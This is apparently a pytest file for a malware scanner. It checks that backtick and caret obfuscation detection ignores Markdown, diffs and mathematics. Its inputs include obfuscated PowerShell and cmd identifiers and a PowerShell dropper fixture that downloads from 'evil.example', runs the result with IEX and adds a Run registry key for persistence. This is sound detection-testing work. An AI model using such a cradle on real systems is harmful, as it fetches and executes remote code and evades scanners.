"""A `code span` is Markdown. A backtick inside a word is obfuscation.

`_RE_BACKTICK` was `re.compile("`")` — every backtick, anywhere — and
`_RE_CARET` was `re.compile("\\^")`. Both counted a common character and called
the total a technique, which is the same defect as matching two common strings
far apart.

Markdown writes code with backticks. Measured on the documentation extracted from
the benign archives, 34 files tripped the backtick technique: caddy's and hugo's
`CHANGELOG.md` have 910 and 253 backticks, curl's `MANUAL.md` has 386. All of
them came out `Script.Suspicious.ObfuscationHigh`, and because a container takes
its verdict from a member, that made `caddy.zip` and `hugo.zip` suspicious too.
Carets have the same problem with regular expressions, diffs and mathematics.

What the technique is actually about is an escape character splitting an
identifier so a scanner will not recognise it:

    i`e`x                       PowerShell
    Inv`oke-Expr`ession
    p^o^w^e^r^s^h^e^l^l         cmd

In every one of those the escape sits BETWEEN two word characters. A Markdown
code span (`` `--flag` ``) and a fence (```` ``` ````) both put the backtick
against whitespace or another backtick, so neither can reach it.

Measured cost:

    benign documentation   34 files tripped  ->  0
    script malware          0 backtick / 5 caret  ->  0 backtick / 5 caret

The only files that stopped tripping were compiled binaries where the backtick
was a random byte — one `.dll` had 4095 of them — and a PE never reaches the
script analyzer anyway.
"""
from __future__ import annotations

import pytest

from app.engine.analyzers import scripts


def _techniques(text: str) -> list[str]:
    return scripts._obfuscation_techniques(text)


def _has(text: str, needle: str) -> bool:
    return any(needle in technique for technique in _techniques(text))


# --- the real trick still trips ----------------------------------------------

REAL = [
    ("PowerShell iex split", "i`e`x " * 30, "backtick"),
    ("PowerShell identifier split",
     "Inv`oke-Expr`ession Down`loadStr`ing New-Ob`ject " * 12, "backtick"),
    ("PowerShell mixed", "$a=`I`E`X; `I`E`X (`N`ew-`O`bject Net.WebClient) " * 14, "backtick"),
    ("cmd caret split", "p^o^w^e^r^s^h^e^l^l -e^n^c " * 20, "caret"),
    ("cmd caret on cscript", "c^s^c^r^i^p^t //e:jscript " * 20, "caret"),
]


@pytest.mark.parametrize("label,payload,kind", REAL, ids=[r[0] for r in REAL])
def test_escaped_identifiers_are_still_obfuscation(label, payload, kind) -> None:
    assert _has(payload, kind), (label, _techniques(payload))


# --- ordinary documents stop tripping ----------------------------------------

DOCUMENTS = [
    ("Markdown code spans",
     "Use the `--flag` option, or `--other`, or `-v` for verbose. " * 60),
    ("Markdown fences", "```bash\ncurl -O https://example.org/x\n```\n" * 60),
    ("Markdown inline mix",
     "Run `caddy run` then `caddy reload`. See `Caddyfile` for `directives`. " * 50),
    ("reStructuredText literals", "Use ``--flag`` and ``--other`` and ``-v``. " * 60),
    ("a changelog", "- fixed `--http2` handling in `curl_easy_setopt` (#1234)\n" * 120),
    ("regex-heavy notes", "match ^start and ^end and ^again and ^more " * 40),
    ("a diff", "^ caret column marker in a text diff\n" * 60),
    ("mathematics", "x^2 + y^2 = z^2 and 10^6 and n^3 for k^2 " * 40),
]


@pytest.mark.parametrize("label,payload", DOCUMENTS, ids=[d[0] for d in DOCUMENTS])
def test_a_document_is_not_obfuscated(label, payload) -> None:
    found = _techniques(payload)
    assert not any("backtick" in t or "caret" in t for t in found), (label, found)


def test_the_patterns_require_a_word_character_on_both_sides() -> None:
    """Stated as a property, so a later "simplification" back to a bare
    character class fails here rather than in production."""
    assert scripts._RE_BACKTICK.search("i`e`x")
    assert not scripts._RE_BACKTICK.search("`code`")
    assert not scripts._RE_BACKTICK.search("``` fence")
    assert not scripts._RE_BACKTICK.search("a ` b")
    assert scripts._RE_CARET.search("p^o^w")
    assert not scripts._RE_CARET.search("^anchor")
    assert not scripts._RE_CARET.search("x ^ y")
    assert not scripts._RE_CARET.search("x^2"), "a numeric exponent is mathematics"


def test_a_real_dropper_using_backticks_is_still_caught(tmp_path) -> None:
    """End to end through the analyzer, not just the pattern: an escaped-identifier
    cradle must still be reported."""
    import hashlib

    from app.engine import identify, scoring, verdict
    from app.engine.contracts import Sample

    payload = (
        b"$c = New-Ob`ject Net.WebC`lient\n"
        b"$d = $c.Down`loadStr`ing('http://evil.example/s')\n"
        b"I`E`X $d\n"
        b"New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        b" -Name Upd -Value 'p.exe'\n"
    ) * 6
    path = tmp_path / "stage.ps1"
    path.write_bytes(payload)
    ident = identify.identify(str(path), "stage.ps1")
    sample = Sample(
        path=str(path), size_bytes=len(payload),
        sha256=hashlib.sha256(payload).hexdigest(),
        md5=hashlib.md5(payload).hexdigest(),
        mime=ident.mime, magic=ident.magic,
        claimed_extension=ident.claimed_extension, original_name="stage.ps1",
        extension_mismatch=ident.extension_mismatch, family=ident.family,
    )
    result = scripts.analyze(sample)
    ids = {s.id for s in result.signals}
    assert "script.obfuscation_high" in ids, sorted(ids)
    risk = scoring.assess([result], ioc_total=result.iocs.total(), family=sample.family)
    got = verdict.classify(sample.family, sample.mime, [result], result.iocs,
                           risk.final_score)
    assert got.verdict in ("malicious", "suspicious"), (got.to_dict(), risk.final_score)
